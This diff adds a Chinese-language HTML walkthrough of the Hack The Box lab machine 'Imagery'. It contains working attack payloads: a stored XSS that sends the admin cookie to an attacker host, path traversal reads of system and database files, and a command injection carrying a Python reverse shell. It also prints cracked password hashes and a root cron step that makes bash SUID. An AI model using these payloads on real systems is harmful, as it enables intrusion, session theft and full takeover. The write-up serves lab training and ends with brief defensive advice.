@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Imagery — Nauhcnes</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--phase-recon:#60a5fa;--phase-foothold:#4ade80;--phase-lateral:#a78bfa;--phase-privesc:#f87171;--medium:#fbbf24;--linux:#60a5fa}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,pre{font-family:'IBM Plex Mono',monospace}
+code{background:var(--surface-raised);padding:0.15em 0.4em;border-radius:3px;font-size:0.88em}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;font-size:0.82rem;line-height:1.6;margin:1rem 0}
+.header{border-bottom:1px solid var(--border);padding:2.5rem 2rem 2rem;position:relative}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--medium)}
+.header-inner{max-width:820px;margin:0 auto}
+.back{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted);text-decoration:none;display:inline-block;margin-bottom:1rem}
+.back:hover{color:var(--accent)}
+.header h1{font-size:2rem;font-weight:700;color:var(--heading);letter-spacing:-0.02em}
+.header-meta{margin-top:0.6rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;color:var(--text-muted);display:flex;gap:1.2rem;flex-wrap:wrap}
+.tag{padding:0.15rem 0.5rem;border-radius:3px;background:var(--surface-raised)}
+.tag-medium{color:var(--medium)}
+.tag-linux{color:var(--linux)}
+main{max-width:820px;margin:0 auto;padding:1.5rem 2rem 4rem}
+h2{font-size:1.3rem;font-weight:700;color:var(--heading);margin:2.5rem 0 1rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.05rem;font-weight:600;color:var(--heading);margin:1.8rem 0 0.8rem}
+h4{font-size:0.95rem;font-weight:600;color:var(--heading);margin:1.4rem 0 0.6rem}
+p{margin:0.6rem 0}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem}
+th,td{border:1px solid var(--border);padding:0.5rem 0.8rem;text-align:left}
+th{background:var(--surface);color:var(--heading);font-weight:600}
+td{background:var(--surface)}
+.callout{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.2rem;margin:1rem 0;font-size:0.9rem}
+.callout-warn{border-left-color:var(--medium)}
+.phase{font-family:'IBM Plex Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.2rem 0.6rem;border-radius:3px;display:inline-block;margin-bottom:0.4rem}
+.phase-recon{background:#1e3a5f40;color:var(--phase-recon)}
+.phase-foothold{background:#16653420;color:var(--phase-foothold)}
+.phase-lateral{background:#4c1d9520;color:var(--phase-lateral)}
+.phase-privesc{background:#991b1b20;color:var(--phase-privesc)}
+.diagram{display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding:1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin:1.5rem 0;font-family:'IBM Plex Mono',monospace;font-size:0.78rem}
+.node{padding:0.3rem 0.7rem;border-radius:4px;white-space:nowrap}
+.node-green{background:#16653430;color:var(--phase-foothold);border:1px solid #16653460}
+.node-purple{background:#4c1d9530;color:var(--phase-lateral);border:1px solid #4c1d9560}
+.node-red{background:#991b1b30;color:var(--phase-privesc);border:1px solid #991b1b60}
+.arrow{color:var(--text-muted)}
+.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;color:var(--text-muted);border-top:1px solid var(--border)}
+.gate{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
+.gate input{background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.9rem;text-align:center;outline:none;width:220px}
+.gate input:focus{border-color:var(--accent)}
+.gate label{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted)}
+.gate .err{color:var(--phase-privesc);font-size:0.75rem;font-family:'IBM Plex Mono',monospace;height:1rem}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+<label>输入机器名称解锁</label>
+<input type="password" id="gate-pw" placeholder="machine name" autofocus>
+<div class="err" id="gate-err"></div>
+</div>
+<script>
+document.getElementById('gate-pw').addEventListener('keydown',function(e){
+if(e.key==='Enter'){
+if(this.value.toLowerCase()==='imagery'){document.getElementById('gate').style.display='none'}
+else{document.getElementById('gate-err').textContent='wrong password'}
+}});
+</script>
+
+<div class="header">
+<div class="header-inner">
+<a class="back" href="../">← 返回目录</a>
+<h1>Imagery</h1>
+<div class="header-meta">
+<span class="tag tag-medium">Medium</span>
+<span class="tag tag-linux">Linux</span>
+<span>10.129.242.164</span>
+</div>
+</div>
+</div>
+
+<main>
+
+<div class="diagram"><span class="node node-green">XSS 窃取 Admin Cookie</span><span class="arrow">→</span><span class="node node-green">路径穿越读 db.json</span><span class="arrow">→</span><span class="node node-green">Transform width 命令注入 → web shell</span><span class="arrow">→</span><span class="node node-purple">pyAesCrypt 备份破解 → mark</span><span class="arrow">→</span><span class="node node-red">sudo charcol cron 注入 → root</span></div>
+
+<h2><span class="phase phase-recon">信息收集</span> Nmap 扫描</h2>
+
+<pre>sudo nmap -sCV -p- -T4 10.129.242.164</pre>
+
+<pre>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu
+8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7) — Image Gallery</pre>
+
+<h2><span class="phase phase-foothold">立足点</span> XSS 窃取 Admin Cookie → 路径穿越 → 命令注入</h2>
+
+<h3>注册账号并上传含 XSS 的图片</h3>
+<p>注册普通账号后，上传一张图片，在描述中注入 XSS payload 窃取管理员 Cookie：</p>
+
+<pre>&lt;img src=x onerror="window.location.href='http://10.10.15.65:8888/c='+btoa(document.cookie);" /&gt;</pre>
+
+<p>攻击机监听：</p>
+<pre>python3 -m http.server 8888</pre>
+
+<p>收到管理员的 Base64 编码 Cookie，解码后替换浏览器 Cookie，获取 admin 面板访问权限。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：我们上传了一张"会说话的图片"——图片描述里藏着一段 JavaScript 代码。管理员打开图片页面时，代码自动把管理员的"通行证"（Cookie）偷偷发给我们。我们拿着这张通行证冒充管理员登录。</div>
+
+<h3>Admin 面板路径穿越读取数据库</h3>
+<p>管理员面板的 <code>/admin/get_system_log?log_identifier=</code> 参数存在路径穿越：</p>
+
+<pre>http://10.129.242.164:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd</pre>
+
+<p>确认用户 <code>web</code>（UID 1001）和 <code>mark</code>（UID 1002）。</p>
+
+<p>读取应用数据库：</p>
+<pre>http://10.129.242.164:8000/admin/get_system_log?log_identifier=/home/web/web/db.json</pre>
+
+<pre>{
+  "users": [
+    {"username": "admin@imagery.htb", "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31", "isAdmin": true},
+    {"username": "testuser@imagery.htb", "password": "2c65c8d7bfbca32a3ed42596192384f6", "isTestuser": true}
+  ]
+}</pre>
+
+<p>破解 testuser 的 MD5 哈希：<code>2c65c8d7bfbca32a3ed42596192384f6</code> → <code>iambatman</code></p>
+
+<h3>Transform Image 命令注入</h3>
+<p>用 <code>testuser@imagery.htb</code> / <code>iambatman</code> 登录。testuser 有"Transform Image"功能（调整图片尺寸），<code>width</code> 参数存在命令注入：</p>
+
+<pre>{
+  "width": "800; python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('10.10.15.65',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\";"
+}</pre>
+
+<pre>nc -lnvp 5555
+# web@Imagery shell obtained</pre>
+
+<h2><span class="phase phase-lateral">横向移动</span> 加密备份 → mark 密码</h2>
+
+<h3>发现加密备份文件</h3>
+<pre>web@Imagery:/var/backup$ ls
+web_20250806_120723.zip.aes</pre>
+
+<p>文件使用 pyAesCrypt 6.1.1 加密。下载到攻击机后暴力破解：</p>
+
+<pre>python3 dpyAesCrypt.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt -t 100</pre>
+
+<pre>[✅] Password found: bestfriends</pre>
+
+<p>解密并解压后，在旧版 <code>db.json</code> 中发现 mark 用户：</p>
+<pre>{"username": "mark@imagery.htb", "password": "01c3d2e5bdaf6134cec0a367cf53e535"}</pre>
+
+<p>破解 MD5：<code>01c3d2e5bdaf6134cec0a367cf53e535</code> → <code>supersmash</code></p>
+
+<h3>切换到 mark</h3>
+<pre>su mark
+# 密码: supersmash</pre>
+
+<pre>mark@Imagery:~$ cat user.txt
+f672b07ba510579bcaaba34013d74e45</pre>
+
+<h2><span class="phase phase-privesc">权限提升</span> sudo charcol 恶意 Cron 任务</h2>
+
+<h3>检查 sudo 权限</h3>
+<pre>mark@Imagery:~$ sudo -l
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol</pre>
+
+<p><strong>Charcol</strong> 是一个 CLI 备份工具，支持创建加密备份、下载文件，以及通过 <code>auto add</code> 管理 cron 定时任务。</p>
+
+<h3>初始化 Charcol</h3>
+<pre># 先重置密码到默认
+sudo /usr/local/bin/charcol -R
+
+# 进入交互 shell，设置应用密码
+sudo /usr/local/bin/charcol shell
+# 设置密码（如 123）和 master passphrase（如 123）</pre>
+
+<h3>创建恶意 Cron 任务</h3>
+<p>Charcol 的 <code>auto add</code> 功能可以创建 cron 任务，且不验证命令内容的安全性。由于 <code>sudo charcol</code> 以 root 运行，创建的 cron 任务也以 root 权限执行：</p>
+
+<pre>sudo /usr/local/bin/charcol shell
+# 输入 master passphrase
+
+charcol&gt; auto add --schedule "* * * * *" --command "/bin/bash -c 'chmod u+s /bin/bash'" --name "pwn"
+# 输入应用密码确认</pre>
+
+<pre>[INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c 'chmod u+s /bin/bash'</pre>
+
+<div class="callout">🧒 <strong>儿童版</strong>：Charcol 是一个备份工具，它有"定时任务"功能，可以设置每隔一段时间自动运行命令。管理员给了 mark <code>sudo charcol</code> 的权限，本意是让他做自动备份。但 Charcol 不检查命令内容是否安全——我们写了一条"给 /bin/bash 加 SUID 权限"的命令，设为每分钟执行一次。root 就乖乖帮我们做了。</div>
+
+<h3>等待 Cron 执行</h3>
+<p>等待 1 分钟后：</p>
+
+<pre>mark@Imagery:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1474768 Oct 26 2024 /bin/bash
+
+mark@Imagery:~$ /bin/bash -p
+
+bash-5.2# cat /root/root.txt
+2db48c3abd38b52fc3824033554ed2fd</pre>
+
+<div class="callout callout-warn">
+<p><strong>⚠️ 踩坑提醒</strong></p>
+<p>XSS 窃取 Cookie 需要攻击机开 HTTP 服务器接收，Base64 解码后是完整的 Flask session</p>
+<p>Transform Image 的命令注入在 <code>width</code> 参数中，需要用分号 <code>;</code> 截断</p>
+<p>pyAesCrypt 加密文件的暴力破解需要专用工具 <code>dpyAesCrypt.py</code>，普通的 <code>john</code>/<code>hashcat</code> 不支持</p>
+<p>Charcol 的 <code>auto add</code> 需要先设置应用密码和 master passphrase，否则无法使用</p>
+<p><code>* * * * *</code> 表示每分钟执行一次，最多等 60 秒</p>
+</div>
+
+<h2>知识点速查表</h2>
+
+<table>
+<tr><th>阶段</th><th>技术</th><th>工具</th><th>助记词</th></tr>
+<tr><td>立足点</td><td>存储型 XSS 窃取管理员 Cookie</td><td>img onerror + btoa</td><td>🎣 "图片偷通行证"</td></tr>
+<tr><td>信息泄露</td><td>Admin 面板路径穿越读文件</td><td>get_system_log?log_identifier=../</td><td>📂 "日志接口跳目录"</td></tr>
+<tr><td>命令执行</td><td>Transform Image width 参数注入</td><td>Burp 修改 width 字段</td><td>💉 "宽度参数塞命令"</td></tr>
+<tr><td>横向移动</td><td>pyAesCrypt 加密备份暴力破解</td><td>dpyAesCrypt.py + rockyou</td><td>🔨 "砸加密备份"</td></tr>
+<tr><td>权限提升</td><td>sudo charcol auto add 恶意 cron</td><td><code>auto add --command "chmod u+s /bin/bash"</code></td><td>⏰ "定时任务开后门"</td></tr>
+</table>
+
+<h2>额外知识</h2>
+
+<h3>Flask Session 安全</h3>
+<p>Flask 的默认 session 实现是客户端 session——数据存储在 Cookie 中，经过 Base64 编码 + HMAC 签名。签名使用 <code>SECRET_KEY</code>，防止篡改但<strong>不加密</strong>（内容可被读取）。如果 <code>SECRET_KEY</code> 泄露或可被暴力破解（使用 <code>flask-unsign</code> 工具），攻击者可以伪造任意 session 内容（如 <code>isAdmin: true</code>）。</p>
+
+<h3>pyAesCrypt 加密格式</h3>
+<p>pyAesCrypt 使用 AES-256-CBC 加密，密钥由用户密码通过 PBKDF2 派生。文件头包含版本标识（<code>AES</code>），与标准的 OpenSSL 加密格式不同。破解需要专用工具而非通用的 <code>john</code>/<code>hashcat</code>。弱密码（如本靶机的 <code>bestfriends</code>）在 rockyou 字典中很快就能找到。</p>
+
+<h3>Sudo 备份工具提权模式</h3>
+<p>本靶机的 Charcol 提权与之前遇到的 Composer（Academy）、bbot（Cypher）属于同一类型：管理员授予 <code>sudo</code> 权限的工具允许执行任意命令或加载用户可控代码。防御方式是遵循最小权限原则——不给备份工具完整的 sudo 权限，而是用专用的 systemd timer 或受限的 cron 配置。</p>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Imagery 攻略 · 2026</footer>
+</body></html>
